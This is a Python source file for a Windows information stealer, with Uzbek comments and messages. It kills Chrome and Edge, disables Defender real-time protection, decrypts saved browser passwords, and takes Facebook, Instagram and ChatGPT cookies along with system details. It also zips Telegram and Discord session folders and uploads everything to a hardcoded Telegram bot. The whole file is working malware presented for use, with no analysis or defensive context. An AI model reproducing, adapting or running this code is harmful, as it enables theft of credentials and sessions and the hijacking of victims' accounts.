import os, json, base64, shutil, sqlite3, socket, platform, getpass, zipfile, requests
from pathlib import Path
from datetime import datetime
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData

BOT_TOKEN = '7211406891:AAHrj9KRnE82oxZXJKthmnL7XkoCzsFZtE0'
CHAT_ID = '6655243292'

def kill_browser_processes():
    os.system("taskkill /f /im chrome.exe >nul 2>&1")
    os.system("taskkill /f /im msedge.exe >nul 2>&1")

def disable_defender():
    os.system('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1')

def get_master_key(local_state_path):
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.loads(f.read())
    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
    return CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_chrome_value(encrypted_value, master_key):
    try:
        if encrypted_value[:3] == b'v10':
            iv = encrypted_value[3:15]
            payload = encrypted_value[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
            decrypted = cipher.decrypt(payload)[:-16].decode()
            return decrypted
        else:
            return CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
    except Exception:
        return ""

def extract_passwords():
    browsers = {
        'Chrome': os.path.join(os.getenv('LOCALAPPDATA'), r'Google\Chrome\User Data\Default'),
        'Edge': os.path.join(os.getenv('LOCALAPPDATA'), r'Microsoft\Edge\User Data\Default'),
    }

    entries = []

    for name, path in browsers.items():
        if not os.path.exists(path):
            continue

        master_key = get_master_key(os.path.join(path, "..", "Local State"))
        login_db = os.path.join(path, "Login Data")
        if os.path.exists(login_db):
            try:
                temp_db = os.path.join(os.getenv("TEMP"), f"{name}_logins.db")
                shutil.copy2(login_db, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                for url, user, encpass in cursor.fetchall():
                    password = decrypt_chrome_value(encpass, master_key)
                    if url and user and password:
                        entries.append((url.strip(), user.strip(), password.strip()))
                conn.close()
                os.remove(temp_db)
            except Exception as e:
                entries.append((f"[{name}] ERROR", "N/A", str(e)))

    if not entries:
        return "🔐 Hech qanday parol topilmadi.\n"

    report = "📋 < BROWSER PASSWORDS >\n\n"
    for url, user, passwd in entries:
        report += f"Site: {url}\nLogin: {user}\nParol: {passwd}\n\n************\n\n"
    return report

def extract_cookies(browser_name, profile_path):
    cookie_path = os.path.join(profile_path, "Cookies")
    target_domains = ['facebook.com', 'instagram.com', 'chat.openai.com']
    extracted = []

    if not os.path.exists(cookie_path):
        return []

    try:
        temp_path = os.path.join(os.getenv("TEMP"), f"{browser_name}_cookies.db")
        shutil.copy2(cookie_path, temp_path)

        conn = sqlite3.connect(temp_path)
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")

        master_key = get_master_key(os.path.join(profile_path, "..", "Local State"))

        for host, name, enc_val in cursor.fetchall():
            if any(domain in host for domain in target_domains):
                val = decrypt_chrome_value(enc_val, master_key)
                extracted.append(f"{host} | {name} = {val}")

        conn.close()
        os.remove(temp_path)
    except Exception as e:
        extracted.append(f"[{browser_name}] Cookie ERROR: {str(e)}")

    return extracted

def get_sys_info():
    info = []
    info.append(f"👤 Foydalanuvchi: {getpass.getuser()}")
    info.append(f"💻 Kompyuter nomi: {platform.node()}")
    info.append(f"🖥 OS: {platform.system()} {platform.release()}")
    info.append(f"🌐 IP manzil: {socket.gethostbyname(socket.gethostname())}")
    info.append(f"🕓 Vaqt: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    return "\n".join(info)

def zip_sessions():
    targets = {
        "Telegram": os.path.join(os.getenv("APPDATA"), "Telegram Desktop", "tdata"),
        "Discord": os.path.join(os.getenv("APPDATA"), "discord"),
    }

    zip_path = os.path.join(Path.home(), "sessions.zip")
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for name, path in targets.items():
            if not os.path.exists(path):
                continue
            for root, _, files in os.walk(path):
                for file in files:
                    full_path = os.path.join(root, file)
                    arcname = os.path.relpath(full_path, path)
                    zipf.write(full_path, f"{name}/{arcname}")
    return zip_path

def send_text_to_telegram(text):
    if not text.strip():
        return
    filename = f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    filepath = os.path.join(Path.home(), filename)

    with open(filepath, "w", encoding='utf-8') as f:
        f.write(text)

    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    with open(filepath, "rb") as f:
        requests.post(url, data={"chat_id": CHAT_ID}, files={"document": f})
    os.remove(filepath)

def send_file_to_telegram(file_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    with open(file_path, "rb") as f:
        requests.post(url, data={"chat_id": CHAT_ID}, files={"document": f})
    os.remove(file_path)

# ==== BOSHLANISH ====
if __name__ == "__main__":
    kill_browser_processes()
    disable_defender()

    info = get_sys_info()
    passwords = extract_passwords()
    cookies = []

    for name, path in {
        'Chrome': os.path.join(os.getenv('LOCALAPPDATA'), r'Google\Chrome\User Data\Default'),
        'Edge': os.path.join(os.getenv('LOCALAPPDATA'), r'Microsoft\Edge\User Data\Default'),
    }.items():
        cookies.extend(extract_cookies(name, path))

    report = "\n=== KOMPYUTER MA'LUMOTLARI ===\n" + info
    report += "\n\n=== PAROLLAR ===\n" + passwords
    report += "\n\n=== COOKIE’LAR ===\n" + "\n".join(cookies)

    send_text_to_telegram(report)

    zpath = zip_sessions()
    send_file_to_telegram(zpath)
